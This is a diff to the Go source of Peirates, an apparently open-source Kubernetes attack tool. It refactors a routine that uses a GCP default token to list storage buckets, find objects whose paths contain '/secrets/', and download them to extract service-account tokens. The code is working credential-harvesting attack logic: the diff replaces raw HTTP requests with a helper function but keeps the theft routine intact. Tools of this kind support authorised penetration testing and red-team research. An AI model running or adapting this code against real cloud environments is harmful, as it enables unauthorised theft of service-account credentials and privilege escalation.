@@ -1404,12 +1404,6 @@ Peirates:># `)
 				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
 			}
 
-			// Eliminate once all GETS and POSTS are replaced
-			tr := &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			}
-			sslClient := &http.Client{Transport: tr}
-
 			// Need to get project ID from metadata API
 			var headers []HeaderLine
 			headers = []HeaderLine{
@@ -1446,31 +1440,18 @@ Peirates:># `)
 
 			// In every bucket URL, look at the objects
 			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
+			// We use the same headers[] from the previous GET request.
 			for _, line := range bucketUrls {
 				println("Checking bucket for credentials:", line)
 				urlListObjects := line + "/o"
-				reqListObjects, err := http.NewRequest("GET", urlListObjects, nil)
-				reqListObjects.Header.Add("Metadata-Flavor", "Google")
-				bearerToken := "Bearer " + token
-				reqListObjects.Header.Add("Authorization", bearerToken)
-				reqListObjects.Header.Add("Accept", "json")
-				respListObjects, err := sslClient.Do(reqListObjects)
-				if err != nil {
-					fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
-					respListObjects.Body.Close()
-					break
+				bodyListObjects := GetRequest(urlListObjects, headers, false)
+				if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
+					continue
 				}
-				if respListObjects.StatusCode != 200 {
-					fmt.Printf("[-] Attempt to get bucket contents failed with status code %d\n", respListObjects.StatusCode)
-					break
-				}
-
-				defer respListObjects.Body.Close()
-				bodyListObjects, err := ioutil.ReadAll(respListObjects.Body)
-				objectList_lines := strings.Split(string(bodyListObjects), "\n")
+				objectListLines := strings.Split(string(bodyListObjects), "\n")
 
 				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
-				for _, line := range objectList_lines {
+				for _, line := range objectListLines {
 					if strings.Contains(line, "selfLink") {
 						if strings.Contains(line, "%2Fsecrets%2F") {
 							objectUrl := strings.Split(line, "\"")[3]
@@ -1482,24 +1463,15 @@ Peirates:># `)
 							// Get the contents of the bucket to get the service account token
 							saTokenUrl := objectUrl + "?alt=media"
 
-							reqToken, err := http.NewRequest("GET", saTokenUrl, nil)
-							reqToken.Header.Add("Metadata-Flavor", "Google")
-							reqToken.Header.Add("Authorization", bearerToken)
-							reqToken.Header.Add("Accept", "json")
-							respToken, err := sslClient.Do(reqToken)
-							if err != nil {
-								fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
-								respToken.Body.Close()
-								break
+							// We use the same headers[] from the previous GET request.
+							bodyToken := GetRequest(saTokenUrl, headers, false)
+							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
+								continue
+								// TODO: mark the continue point
 							}
-							if respToken.StatusCode != 200 {
-								fmt.Printf("[-] Attempt to get object contents failed with status code %d\n", respToken.StatusCode)
-								break
-							}
-
-							defer respToken.Body.Close()
-							bodyToken, err := ioutil.ReadAll(respToken.Body)
 							tokenLines := strings.Split(string(bodyToken), "\n")
+							// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
+
 							for _, line := range tokenLines {
 								// Now parse this line to get the token
 								encodedToken := strings.Split(line, "\"")[3]
